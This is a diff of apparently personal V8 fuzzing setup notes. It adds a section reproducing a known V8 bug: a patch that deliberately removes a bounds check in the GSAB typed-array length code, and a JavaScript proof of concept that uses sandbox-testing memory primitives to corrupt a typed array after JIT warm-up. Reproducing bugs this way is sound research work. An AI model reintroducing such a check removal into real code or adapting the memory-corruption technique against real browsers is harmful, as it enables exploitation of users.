@@ -18,10 +18,22 @@
 
 # Setup 
 
+Hidden git hash on zsh:
+
+```bash
+git config oh-my-zsh.hide-info 1
+```
+
+Generate `compile_command.json` file:
+
+```bash
+/tools/clang/scripts/generate_compdb.py -p out/debug > compile_commands.json
+```
+
+
 1. Install v8, depot_tools+AFLplusplus
 
 - Remember changing UID:GID in Dockerfile before building
-
 
 ```bash
 # install depot_tools
@@ -1127,4 +1139,105 @@ void CpuFeatures::ProbeImpl(bool cross_compile) {
   } else if (strcmp(v8_flags.mcpu, "atom") == 0) {
     SetSupported(INTEL_ATOM);
   }
+```
+
+
+
+### Reproducing Manfred's bug
+
+- Issue: https://chromium-review.googlesource.com/c/v8/v8/+/5383483
+
+Patch `src/compiler/graph-assembler.cc` file:
+
+```cpp
+    // 4) Length-tracking backed by GSAB (BackingStore stores the length)
+    auto GsabTracking = [&]() {
+      TNode<Number> temp = TNode<Number>::UncheckedCast(a.TypeGuard(
+          TypeCache::Get()->kJSArrayBufferViewByteLengthType,
+          a.JSCallRuntime1(Runtime::kGrowableSharedArrayBufferByteLength,
+                           buffer, context, base::nullopt,
+                           Operator::kNoWrite)));
+      TNode<UintPtrT> byte_length =
+          a.EnterMachineGraph<UintPtrT>(temp, UseInfo::Word());
+      TNode<UintPtrT> byte_offset = MachineLoadField<UintPtrT>(
+          AccessBuilder::ForJSArrayBufferViewByteOffset(), view,
+          UseInfo::Word());
+
+      return a
+          .MachineSelectIf<UintPtrT>(
+              a.UintPtrLessThanOrEqual(byte_offset, byte_length))
+          .Then([&]() {
+            // length = floor((byte_length - byte_offset) / element_size)
+            return a.UintPtrDiv(a.UintPtrSub(byte_length, byte_offset),
+                                a.ChangeUint32ToUintPtr(element_size));
+          })
+          .Else([&]() { return a.UintPtrConstant(0); })
+          .ExpectTrue()
+          .Value();
+    };
+
+// ===================
+    // 4) Length-tracking backed by GSAB (BackingStore stores the length)
+    auto GsabTracking = [&]() {
+      TNode<Number> temp = TNode<Number>::UncheckedCast(a.TypeGuard(
+          TypeCache::Get()->kJSArrayBufferViewByteLengthType,
+          a.JSCallRuntime1(Runtime::kGrowableSharedArrayBufferByteLength,
+                           buffer, context, base::nullopt,
+                           Operator::kNoWrite)));
+      TNode<UintPtrT> byte_length =
+          a.EnterMachineGraph<UintPtrT>(temp, UseInfo::Word());
+      TNode<UintPtrT> byte_offset = MachineLoadField<UintPtrT>(
+          AccessBuilder::ForJSArrayBufferViewByteOffset(), view,
+          UseInfo::Word());
+
+      return a.UintPtrDiv(a.UintPtrSub(byte_length, byte_offset),
+                          a.ChangeUint32ToUintPtr(element_size));
+```
+
+- POC:
+
+```js
+// r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/test3.js
+
+let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
+
+function addrOf(obj) {
+    return Sandbox.getAddressOf(obj);
+  }
+  
+  function v8_read64(addr) {
+    return sandboxMemory.getBigUint64(Number(addr), true);
+  }
+  
+  function v8_write64(addr, val) {
+    return sandboxMemory.setBigInt64(Number(addr), val, true);
+  }
+
+const gsab = new SharedArrayBuffer(0x16,{"maxByteLength":0x4242});
+const u16arr = new Uint16Array(gsab,0x10);
+// u16arr[1] = 1;
+// console.log(u16arr[1]);
+
+function foo(obj,index, val) {
+    obj[index] += val;
+    return obj[index];
+
+}
+
+function test(iii,val) {
+    return foo(u16arr, iii, val);
+}
+
+for (var i = 0; i < 0x10000; ++i) {
+    test(1,0);
+}
+// %DebugPrint(gsab);
+%DebugPrint(u16arr);
+console.log(addrOf(u16arr));
+console.log(v8_read64(addrOf(u16arr)+0x17));
+
+v8_write64(addrOf(u16arr)+0x19,0x2e00000n);
+
+test(1, 0);
+
 ```
